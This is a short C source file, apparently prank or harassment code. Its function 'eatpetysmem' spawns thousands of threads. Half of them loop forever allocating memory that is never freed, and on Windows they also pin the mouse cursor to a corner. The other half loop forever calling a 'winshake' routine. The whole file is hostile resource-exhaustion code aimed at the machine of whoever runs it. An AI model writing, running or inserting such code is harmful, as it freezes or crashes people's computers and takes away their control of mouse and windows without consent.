#include <stdlib.h>
#include <pthread.h>


// #define WINDOWS_STP
#ifdef WINDOWS_STP
    #include <Windows.h>
#endif


#define THREAD_COUNT 2077
char *ptr = NULL;


int winshake(int ARG_ONLY_LEFT, int ARG_WAY);


void *thread_function_1(void *arg) 
{
    while (1)
    {
        ptr = malloc(1);
        *ptr = CHAR_MAX;
        #ifdef WINDOWS_STP
            SetCursorPos(2077, 2077);
        #endif
    }

    return NULL;
}


void *thread_function_2(void *arg) 
{
    while (1)
    {
        winshake(0, 10);
    }

    return NULL;
}


int eatpetysmem(void) 
{
    pthread_t threads[THREAD_COUNT];


    for (int i = 0; i < THREAD_COUNT; i++) 
    {
        pthread_create(&threads[i], NULL, thread_function_1, NULL);
        pthread_create(&threads[i], NULL, thread_function_2, NULL);
    }


    pthread_exit(NULL);


    return 0;
}